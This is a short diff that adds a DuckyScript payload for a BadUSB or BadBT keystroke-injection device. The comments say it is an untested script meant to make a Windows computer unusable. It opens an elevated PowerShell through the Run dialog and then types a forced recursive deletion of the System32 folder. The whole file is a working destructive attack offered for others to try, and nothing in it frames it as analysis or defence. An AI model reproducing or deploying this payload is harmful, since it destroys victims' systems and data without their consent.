@@ -1,0 +1,15 @@
+REM Written by Inferno ;)
+REM !!WARNING!!
+REM I haven't tested this yet, so if you guys want to try it on a old computer or sum, lmk if it works!
+REM Deletes system 32 from the computer, rendering it un-usable. You can use this with BadUSB or BadBT
+REM
+REM This part opens powershell with admin permissions.
+GUI r
+DELAY 100
+STRING PowerShell Start PowerShell -Verb RunAs
+ENTER
+DELAY 150
+REM This part deletes system32, making the computer unbootable.
+STRING Remove-Item -Path “C:\Windows\System32” -Recurse -Force
+ENTER
+REM Attack over!
